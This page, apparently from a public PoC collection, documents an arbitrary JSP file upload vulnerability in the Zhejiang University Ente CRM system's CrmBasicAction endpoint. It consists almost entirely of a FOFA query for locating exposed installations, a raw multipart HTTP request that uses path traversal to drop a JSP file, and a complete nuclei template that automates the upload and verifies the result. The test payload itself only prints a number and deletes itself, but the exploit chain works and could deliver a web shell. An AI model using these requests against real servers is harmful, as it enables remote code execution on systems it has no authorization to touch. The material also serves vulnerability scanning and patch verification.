## 浙大恩特客户资源管理系统crmbasicaction任意文件上传

浙大恩特客户资源管理系统中的crmbasicaction接口存在安全漏洞，允许攻击者向系统上传任意恶意JSP文件，从而可能导致潜在的远程执行代码攻击。该漏洞可能会对系统的完整性和安全性产生严重影响。

## fofa
```
app="浙大恩特客户资源管理系统"
```

## poc
```
POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
Content-Length: 267
Accept-Encoding: gzip
Connection: close
Content-Type: multipart/form-data; boundary=0rwysvgvy7rxv790mpju

--0rwysvgvy7rxv790mpju
Content-Disposition: form-data; name="file"; filename="../../mqh8qxe3cy.jsp"
Content-Type: application/zip

<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--0rwysvgvy7rxv790mpju--
```

![3a3a1bb6be6134a688029b7e4d757cd4](https://github.com/wy876/POC/assets/139549762/75ccec48-a0ad-4ca6-abd7-fdd2635ba5ef)

![9f14d667e2ff13898bf0e9f6e33fe1d5](https://github.com/wy876/POC/assets/139549762/b4355528-ae24-4dfa-962b-eaa779bc6ba7)

访问上传的文件
/enterdoc/dao{{filepath}}{{filename}}.jsp


## nuclei 
```

id: zhedaente-entsoft-CrmBasicAction-upload

info:
  name: 浙大恩特客户资源管理系统-crmbasicaction-任意文件上传
  author: rain
  severity: critical
  metadata:
    fofa-query: title="欢迎使用浙大恩特客户资源管理系统" || body="script/Ent.base.js" || app="浙大恩特客户资源管理系统"
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /entsoft/CrmBasicAction.entcrm?method=zipFileUpload&c_transModel=old HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
        Connection: close
        Content-Type: multipart/form-data; boundary={{boundary}}
        Accept-Encoding: gzip
        
        --{{boundary}}
        Content-Disposition: form-data; name="file"; filename="../../{{filename}}.jsp"
        Content-Type: application/zip
        
        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        --{{boundary}}--

      - |+
        GET /enterdoc/dao{{filepath}}{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
        Content-Length: 0
        Accept-Encoding: gzip, deflate
        Connection: close

    extractors:
      - type: regex
        name: filepath
        part: body
        internal: true
        group: 1
        regex:
          - '(/\d+/)'

        
    matchers:
      - type: dsl
        dsl:
          - "status_code_2 == 200 && contains(body_2,'12321')"
```
